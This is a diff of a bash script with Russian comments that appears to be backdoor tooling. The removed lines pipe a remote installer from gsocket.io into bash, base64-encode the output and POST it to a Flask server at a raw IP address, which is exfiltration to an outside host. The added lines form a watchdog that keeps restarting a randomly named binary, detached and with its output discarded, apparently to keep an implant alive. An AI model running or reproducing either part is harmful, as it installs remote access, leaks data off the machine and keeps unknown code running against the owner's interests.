@@ -1,15 +1,35 @@
 #!/bin/bash
 
-# Выполняем команду и сохраняем результат в файл
-bash -c "$(curl -fsSL https://gsocket.io/x)" > lol.txt 2>&1
+# Имя процесса
+PROCESS_NAME="b32q6f.bin"
+# Путь к исполняемому файлу
+BINARY_PATH="./b32q6f.bin"
+# Лог файл
+LOG_FILE="/dev/null"
+# Интервал проверки (в секундах)
+CHECK_INTERVAL=60
 
-# Читаем содержимое файла
-RESULT=$(cat lol.txt)
+# Функция проверки наличия процесса
+check_process() {
+    pgrep -f "$PROCESS_NAME" > /dev/null
+}
 
-# Кодируем в base64 для безопасной передачи через HTTP
-ENCODED_RESULT=$(echo "$RESULT" | base64 -w 0)
+# Функция запуска процесса
+start_process() {
+    echo "[$(date '+%Y-%m-%d %H:%M:%S')] Запускаю процесс $PROCESS_NAME..."
+    nohup setsid "$BINARY_PATH" > "$LOG_FILE" 2>&1 &
+    sleep 2
+}
 
-# Отправляем на Flask-сервер (замените URL на ваш)
-curl -X POST "http://150.241.64.21:5000/upload" \
-     -H "Content-Type: application/json" \
-     -d "{\"data\": \"$ENCODED_RESULT\"}"
+# Основной цикл мониторинга
+echo "[$(date '+%Y-%m-%d %H:%M:%S')] Запуск монитора для процесса $PROCESS_NAME"
+
+while true; do
+    if ! check_process; then
+        echo "[$(date '+%Y-%m-%d %H:%M:%S')] Процесс $PROCESS_NAME не найден, перезапускаю..."
+        start_process
+    fi
+    
+    # Ждем перед следующей проверкой
+    sleep "$CHECK_INTERVAL"
+done
